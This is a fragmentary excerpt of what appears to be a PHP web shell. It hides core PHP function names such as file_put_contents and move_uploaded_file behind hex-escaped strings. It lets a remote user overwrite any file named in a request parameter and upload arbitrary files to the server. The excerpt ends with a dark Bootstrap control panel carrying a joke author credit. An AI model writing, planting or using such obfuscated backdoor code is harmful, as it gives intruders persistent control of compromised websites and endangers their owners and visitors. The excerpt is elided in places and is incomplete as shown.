...
if (isset($_POST['newContent']) && isset($_GET['item'])) {
  $perkeke = "\x73\x74\x72\x69\x70\x73\x6c\x61\x73\x68\x65\x73"($_POST['newContent']);
  if ("\x66\x69\x6c\x65\x5f\x70\x75\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73"($path. '/'. $_GET['item'], $perkeke)) {
...
$totalx = "\x62\x61\x73\x65\x6e\x61\x6d\x65"($_FILES['uploadfile']['name']);
$mainupload = "\x6d\x6f\x76\x65\x5f\x75\x70\x6c\x6f\x61\x64\x65\x64\x5f\x66\x69\x6c\x65"($_FILES['uploadfile']['tmp_name'], $path . '/' . $totalx . "");
  if ($total < 2) {
    if ($mainupload) {
  ...
  <div class="container-fluid">
    <div class="py-3" id="main">
      <div class="box shadow bg-dark p-4 rounded-3">
        ...
        <div class="text-light">&#169; skibiditoilet <script type='text/javascript'>var creditsyear = new Date();document.write(creditsyear.getFullYear());</script></div>
      </div>
    </div>
  </div>
